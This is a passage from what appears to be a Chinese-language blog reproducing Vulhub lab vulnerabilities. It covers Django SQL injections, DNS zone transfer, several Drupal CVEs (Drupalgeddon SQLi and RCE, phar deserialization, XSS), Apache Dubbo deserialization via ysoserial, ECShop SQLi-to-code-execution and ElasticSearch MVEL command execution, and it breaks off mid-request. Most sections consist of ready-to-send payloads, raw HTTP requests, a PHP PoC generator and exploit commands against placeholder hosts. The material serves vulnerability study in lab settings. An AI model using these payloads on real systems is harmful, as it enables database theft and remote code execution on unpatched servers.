SQL注入漏洞（CVE-2020-9402）</h1><blockquote><p>Django在2020年3月4日发布了一个安全更新，修复了在GIS 查询功能中存在的SQL注入漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.djangoproject.com/weblog/2020/mar/04/security-releases/">https://www.djangoproject.com/weblog/2020/mar/04/security-releases/</a></li></ul><p>该漏洞需要开发者使用了GIS中聚合查询的功能，用户在oracle的数据库且可控tolerance查询时的键名，在其位置注入SQL语句。</p></blockquote><h2 id="漏洞复现-33"><a href="#漏洞复现-33" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞一"><a href="#漏洞一" class="headerlink" title="漏洞一"></a>漏洞一</h3><blockquote><p>首先访问<code>http://your-ip:8000/vuln/</code>。</p><p>在该网页中使用<code>get</code>方法构造<code>q</code>的参数，构造SQL注入的字符串<code>20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null OR (1+1</code></p><p><a href="http://your-ip:8000/vuln/?q=20">http://your-ip:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20</a>%20&#x3D;%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v$instance))%20from%20dual)%20is%20null%20%20OR%20)(1%2B1</p><p>可见，括号已注入成功，SQL语句查询报错：</p></blockquote><p><img src="76.jpg" alt="76"></p><h3 id="漏洞二"><a href="#漏洞二" class="headerlink" title="漏洞二"></a>漏洞二</h3><blockquote><p>访问<code>http://your-ip:8000/vuln2/</code>。<br>在该网页中使用<code>get</code>方法构造<code>q</code>的参数，构造出SQL注入的字符串<code>0.05))) FROM &quot;VULN_COLLECTION2&quot; where (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null --</code></p><p><a href="http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))%20from%20dual)%20is%20not%20null%20%20--">http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))%20from%20dual)%20is%20not%20null%20%20--</a></p></blockquote><p><img src="77.jpg" alt="77"></p><h1 id="Django-QuerySet-order-by-SQL注入漏洞（CVE-2021-35042）"><a href="#Django-QuerySet-order-by-SQL注入漏洞（CVE-2021-35042）" class="headerlink" title="Django QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）"></a>Django QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）</h1><blockquote><p>Django在2021年7月1日发布了一个安全更新，修复了在QuerySet底下的order_by函数中存在的SQL注入漏洞</p><p>参考链接:</p><ul><li><a href="https://www.djangoproject.com/weblog/2021/jul/01/security-releases/">https://www.djangoproject.com/weblog/2021/jul/01/security-releases/</a></li></ul><p>该漏洞需要用户可控order_by传入的值，在预期列的位置注入SQL语句。</p></blockquote><h2 id="漏洞复现-34"><a href="#漏洞复现-34" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>访问页面<code>http://your-ip:8000/vuln/</code>，在GET参数中构造<code>order=-id</code>，会得到根据id降序排列的结果：<br><code>http://your-ip:8000/vuln/?order=-id</code></p></blockquote><p><img src="78.jpg" alt="78"></p><blockquote><p>再构造GET参数<code>order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23</code>提交，其中<code>vuln_collection</code>是<code>vuln</code>应用下的模型<code>Collection</code></p><p><code>http://your-ip:8000/vuln/?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23</code></p><p>成功注入SQL语句，利用堆叠注入获得信息：</p></blockquote><p><img src="79.jpg" alt="79"></p><h1 id="Django-Trunc-kind-and-Extract-lookup-name-SQL注入漏洞（CVE-2022-34265）"><a href="#Django-Trunc-kind-and-Extract-lookup-name-SQL注入漏洞（CVE-2022-34265）" class="headerlink" title="Django Trunc(kind) and Extract(lookup_name) SQL注入漏洞（CVE-2022-34265）"></a>Django Trunc(kind) and Extract(lookup_name) SQL注入漏洞（CVE-2022-34265）</h1><blockquote><p>Django在2022年7月4日发布了安全更新，修复了在数据库函数<code>Trunc()</code>和<code>Extract()</code>中存在的SQL注入漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.djangoproject.com/weblog/2022/jul/04/security-releases/">https://www.djangoproject.com/weblog/2022/jul/04/security-releases/</a></li><li><a href="https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492">https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492</a></li></ul></blockquote><h2 id="漏洞复现-35"><a href="#漏洞复现-35" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>修改<code>date</code>参数即可复现SQL注入漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8000/?date=xxxx&#x27;xxxx</span><br></pre></td></tr></table></figure></blockquote><p><img src="80.jpg" alt="80"></p><h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><p>DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/">https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/</a></li><li><a href="https://nmap.org/nsedoc/scripts/dns-zone-transfer.html">https://nmap.org/nsedoc/scripts/dns-zone-transfer.html</a></li></ul><h2 id="漏洞复现-36"><a href="#漏洞复现-36" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>在Linux下，我们可以使用dig命令来发送dns请求。比如，我们可以用<code>dig @your-ip www.vulhub.org</code>获取域名<code>www.vulhub.org</code>在目标dns服务器上的A记录：</p></blockquote><p><img src="81.jpg" alt="81"></p><blockquote><p>发送axfr类型的dns请求：<code>dig @your-ip -t axfr vulhub.org</code></p></blockquote><p><img src="82.jpg" alt="82"></p><blockquote><p>可见，我获取到了<code>vulhub.org</code>的所有子域名记录，这里存在DNS域传送漏洞。</p><p>我们也可以用nmap script来扫描该漏洞：<code>nmap --script dns-zone-transfer.nse --script-args &quot;dns-zone-transfer.domain=vulhub.org&quot; -Pn -p 53 192.168.0.196</code></p></blockquote><p><img src="83.jpg" alt="83"></p><h1 id="Drupal-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）"><a href="#Drupal-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）" class="headerlink" title="Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）"></a>Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</h1><blockquote><p>Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。</p></blockquote><h2 id="漏洞复现-37"><a href="#漏洞复现-37" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>该漏洞无需认证，发送如下数据包即可执行恶意SQL语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /?q=node&amp;destination=node HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 120</span><br><span class="line">pass=lol&amp;form\_build\_id=&amp;form\_id=user\_login\_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a</span><br></pre></td></tr></table></figure><p>可见，信息已被爆出：</p></blockquote><p><img src="84.jpg" alt="84"></p><h1 id="Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）（未完成）"><a href="#Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）（未完成）" class="headerlink" title="Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）（未完成）"></a>Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）（未完成）</h1><blockquote><ul><li>影响软件：Drupal</li><li>方式：反序列化</li><li>参考链接：<a href="https://paper.seebug.org/334/">CVE-2017-6920:Drupal远程代码执行漏洞分析及POC构造</a></li><li>效果：任意代码执行</li></ul></blockquote><h2 id="漏洞复现-38"><a href="#漏洞复现-38" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>apt update网络超时…<br>先跳了</p><h1 id="Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）"><a href="#Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）" class="headerlink" title="Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）"></a>Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）</h1><blockquote><p>Drupal 是一款用量庞大的CMS，其6&#x2F;7&#x2F;8版本的Form API中存在一处远程代码执行漏洞。相关分析如下：</p><ul><li><a href="https://research.checkpoint.com/uncovering-drupalgeddon-2/">https://research.checkpoint.com/uncovering-drupalgeddon-2/</a></li></ul></blockquote><h2 id="漏洞复现-39"><a href="#漏洞复现-39" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>参考<a href="https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py">a2u&#x2F;CVE-2018-7600</a>，我们向安装完成的drupal发送如下数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /user/register?element\_parents=account/mail/%23value&amp;ajax\_form=1&amp;\_wrapper\_format=drupal\_ajax HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line">form\_id=user\_register\_form&amp;\_drupal\_ajax=1&amp;mail[#post\_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</span><br></pre></td></tr></table></figure><p>成功执行代码，这个代码最终执行了id命令：</p></blockquote><p><img src="85.jpg" alt="85"></p><h1 id="Drupal-远程代码执行漏洞（CVE-2018-7602）"><a href="#Drupal-远程代码执行漏洞（CVE-2018-7602）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2018-7602）"></a>Drupal 远程代码执行漏洞（CVE-2018-7602）</h1><blockquote><ul><li>影响软件：drupal</li><li>方式：对URL中的#进行编码两次，绕过sanitize()函数过滤</li><li>效果：任意命令执行</li></ul></blockquote><h2 id="漏洞复现-40"><a href="#漏洞复现-40" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>参考<a href="https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7602.py">pimps&#x2F;CVE-2018-7600</a>的PoC。</p><p>如下图所示，执行以下命令即可复现该漏洞。示例命令为 <code>id</code>，如图红框中显示，可以执行该命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &quot;id&quot;为要执行的命令 第一个drupal为用户名 第二个drupal为密码</span></span><br><span class="line">python3 drupa7-CVE-2018-7602.py -c <span class="string">&quot;id&quot;</span> drupal drupal http://127.0.0.1:8081/</span><br></pre></td></tr></table></figure></blockquote><p><img src="86.jpg" alt="86"></p><h1 id="Drupal-远程代码执行漏洞（CVE-2019-6339）"><a href="#Drupal-远程代码执行漏洞（CVE-2019-6339）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2019-6339）"></a>Drupal 远程代码执行漏洞（CVE-2019-6339）</h1><blockquote><ul><li>影响软件：Drupal</li><li>方式：phar反序列化RCE</li><li>参考链接：<a href="https://paper.seebug.org/897/">Drupal 1-click to RCE 分析</a></li><li>效果：任意命令执行</li></ul></blockquote><h2 id="漏洞复现-41"><a href="#漏洞复现-41" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>如下图所示，先使用管理员用户上传头像，头像图片为构造好的 PoC，参考<a href="https://github.com/thezdi/PoC/tree/master/Drupal">thezdi&#x2F;PoC</a>的PoC。</p></blockquote><p><img src="87.jpg" alt="87"></p><blockquote><p>Drupal 的图片默认存储位置为 <code>/sites/default/files/pictures/&lt;YYYY-MM&gt;/</code>，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。</p><p>访问 <code>http://127.0.0.1:8080/admin/config/media/file-system</code>，在 <code>Temporary directory</code> 处输入之前上传的图片路径，示例为 <code>phar://./sites/default/files/pictures/2019-06/blog-ZDI-CAN-7232-cat_0.jpg</code>，保存后将触发该漏洞。如下图所示，触发成功。</p></blockquote><p>如果不知道图片具体目录可以查看docker下的file目录或使用find命令<br><img src="88.jpg" alt="88"></p><h1 id="Drupal-XSS漏洞（CVE-2019-6341）"><a href="#Drupal-XSS漏洞（CVE-2019-6341）" class="headerlink" title="Drupal XSS漏洞（CVE-2019-6341）"></a>Drupal XSS漏洞（CVE-2019-6341）</h1><blockquote><ul><li>影响软件：Drupal</li><li>方式：通过文件模块或者子系统上传恶意文件触发XSS漏洞</li><li>参考链接：<a href="https://paper.seebug.org/897/">Drupal 1-click to RCE 分析</a></li><li>效果：JS代码执行（Cookies 资料窃取、会话劫持、钓鱼欺骗、网页挂马等）</li></ul></blockquote><h2 id="漏洞复现-42"><a href="#漏洞复现-42" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>该漏洞需要利用drupal文件模块上传文件的漏洞，伪造一个图片文件，上传，文件的内容实际是一段HTML代码，内嵌JS，这样其他用户在访问这个链接时，就可能触发XSS漏洞。</p><p>Drupal 的图片默认存储位置为 <code>/sites/default/files/pictures/&lt;YYYY-MM&gt;/</code>，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。</p><p>使用PoC上传构造好的伪造GIF文件，PoC参考<a href="https://github.com/thezdi/PoC/tree/master/Drupal">thezdi&#x2F;PoC</a>的PoC。</p><p>如图，输入如下命令，即可使用PoC构造样本并完成上传功能，第一个参数为目标IP 第二个参数为目标端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php cve-2019-6341-exp.php 192.168.11.1 8080</span><br></pre></td></tr></table></figure></blockquote><p><img src="90.jpg" alt="90"></p><blockquote><p>上传成功后，访问图片位置，即可触发 XSS 漏洞，如下图所示。</p><p>Tips:</p><ol><li>因为 Chrome 和 FireFox 浏览器自带部分过滤 XSS 功能，所以验证存在时可使用 Edge 浏览器或者 IE 浏览器。</li><li>访问的图片名称为_0的原因是因为 Drupal 的规则机制，具体原理见<a href="https://paper.seebug.org/897/">Drupal 1-click to RCE 分析</a></li></ol></blockquote><p><img src="89.jpg" alt="89"></p><h1 id="Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）"><a href="#Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）" class="headerlink" title="Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）"></a>Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</h1><blockquote><p>Apache Dubbo是一款高性能、轻量级的开源Java RPC服务框架。Dubbo可以使用不同协议通信，当使用http协议时，Apache Dubbo直接使用了Spring框架的<code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</code>类做远程调用，而这个过程会读取POST请求的Body并进行反序列化，最终导致漏洞。</p><p>在Spring文档中，对<code>HttpInvokerServiceExporter</code>有如下描述，并不建议使用：</p><blockquote><p>WARNING: Be aware of vulnerabilities due to unsafe Java deserialization: Manipulated input streams could lead to unwanted code execution on the server during the deserialization step. As a consequence, do not expose HTTP invoker endpoints to untrusted clients but rather just between your own services. In general, we strongly recommend any other message format (e.g. JSON) instead.</p></blockquote><p>这个漏洞影响Apache Dubbo 2.7.4及以前版本，2.7.5后Dubbo使用<code>com.googlecode.jsonrpc4j.JsonRpcServer</code>替换了<code>HttpInvokerServiceExporter</code>。</p><p>参考链接：</p><ul><li><a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html">https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html</a></li><li><a href="https://www.anquanke.com/post/id/198747">https://www.anquanke.com/post/id/198747</a></li><li><a href="https://paper.seebug.org/1128/">https://paper.seebug.org/1128/</a></li></ul></blockquote><h2 id="漏洞复现-43"><a href="#漏洞复现-43" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>利用该漏洞需要先知道目标RPC接口名，而Dubbo所有的RPC配置储存在registry中，通常使用Zookeeper作为registry。如果能刚好找到目标的Zookeeper未授权访问漏洞，那么就可以在其中找到接口的名称与地址。</p><p>Vulhub对外开放了8080端口和2181端口，其中2181即为Zookeeper的端口，我们本地下载<a href="https://zookeeper.apache.org/">Zookeeper</a>，使用其中自带的<strong>zkCli</strong>即可连接到这台Zookeeper服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./zkCli -server target-ip:2181</span><br></pre></td></tr></table></figure><p>连接后进入一个交互式控制台，使用<code>ls</code>即可列出其中所有节点，包括Dubbo相关的配置：</p></blockquote><p><img src="91.jpg" alt="91"><br><img src="92.jpg" alt="92"></p><blockquote><p>获取到RPC接口名为<code>org.vulhub.api.CalcService</code>。直接用ysoserial生成CommonsCollections6的Payload作为POST Body发送到<code>http://your-ip:8080/org.vulhub.api.CalcService</code>即可触发反序列化漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 &quot;touch /tmp/success&quot; &gt; 1.poc</span><br><span class="line">curl -XPOST --data-binary @1.poc http://your-ip:8080/org.vulhub.api.CalcService</span><br></pre></td></tr></table></figure><p>进入容器，可见<code>touch /tmp/success</code>已成功执行。</p></blockquote><p><img src="94.jpg" alt="94"></p><h1 id="ECShop-2-x-3-x-SQL注入-任意代码执行漏洞"><a href="#ECShop-2-x-3-x-SQL注入-任意代码执行漏洞" class="headerlink" title="ECShop 2.x&#x2F;3.x SQL注入&#x2F;任意代码执行漏洞"></a>ECShop 2.x&#x2F;3.x SQL注入&#x2F;任意代码执行漏洞</h1><blockquote><p>ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。</p><p>其2017年及以前的版本中，存在一处SQL注入漏洞，通过该漏洞可注入恶意数据，最终导致任意代码执行漏洞。其3.6.0最新版已修复该漏洞，vulhub中使用其2.7.3最新版与3.6.0次新版进行漏洞复现。</p><p>参考链接：</p><ul><li><a href="https://paper.seebug.org/691/">https://paper.seebug.org/691/</a></li></ul></blockquote><h2 id="漏洞复现-44"><a href="#漏洞复现-44" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我编写了一个脚本，可以生成2.x和3.x的POC：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;&#123;\$asd&#x27;];phpinfo\t();//&#125;xxx&quot;</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="string">&quot;-1&#x27; UNION/\*&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line"><span class="string">&quot;num&quot;</span> =&gt; <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;\*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&#x27;</span>, <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$id</span>), <span class="variable">$shell</span>),</span><br><span class="line"><span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$id</span></span><br><span class="line">];</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$hash3</span> = <span class="string">&#x27;45ea207d7a2b68c49582d2d22adf953a&#x27;</span>;</span><br><span class="line"><span class="variable">$hash2</span> = <span class="string">&#x27;554fcae493e564ee0dc75bdf2ebf94ca&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;POC for ECShop 2.x: \n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$hash2&#125;</span>ads|<span class="subst">&#123;$s&#125;</span><span class="subst">&#123;$hash2&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n\nPOC for ECShop 3.x: \n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$hash3&#125;</span>ads|<span class="subst">&#123;$s&#125;</span><span class="subst">&#123;$hash3&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure><p>生成的POC，放在Referer里发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /user.php?act=login HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS\_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit\_times]=1</span><br><span class="line">Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;\*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/\*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><p>2.x的执行结果</p></blockquote><p><img src="95.jpg" alt="95"></p><blockquote><p>3.x的执行结果：</p></blockquote><p><img src="96.jpg" alt="96"></p><h1 id="ElasticSearch-命令执行漏洞（CVE-2014-3120）测试环境"><a href="#ElasticSearch-命令执行漏洞（CVE-2014-3120）测试环境" class="headerlink" title="ElasticSearch 命令执行漏洞（CVE-2014-3120）测试环境"></a>ElasticSearch 命令执行漏洞（CVE-2014-3120）测试环境</h1><blockquote><p>jre版本：openjdk:8-jre</p><p>elasticsearch版本：v1.1.1</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>相关文档：<a href="http://bouk.co/blog/elasticsearch-rce/">http://bouk.co/blog/elasticsearch-rce/</a> 、 <a href="https://www.t00ls.net/viewthread.php?tid=29408">https://www.t00ls.net/viewthread.php?tid=29408</a></p><p>老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，而MVEL可执行Java代码，而且没有沙盒，所以我们可以直接执行任意代码。</p><p>MVEL执行命令的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.\*;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(Runtime.getRuntime().exec(<span class="string">&quot;id&quot;</span>).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br></pre></td></tr></table></figure></blockquote><h2 id="漏洞复现-45"><a href="#漏洞复现-45" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>将Java代码放入json中：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;filtered&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;match\_all&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;script\_fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;script&quot;</span><span class="punctuation">:</span> <span class="string">&quot;import java.io.\*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/ HTTP/1.1</span><br><span class="line">Host: your-ip:9200</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;phithon&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><img src="97.jpg" alt="97"></p><blockquote><p>然后，执行任意代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /\_search?pretty HTTP/1.1</span><br><span class="line">Host: your-ip:9200</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span 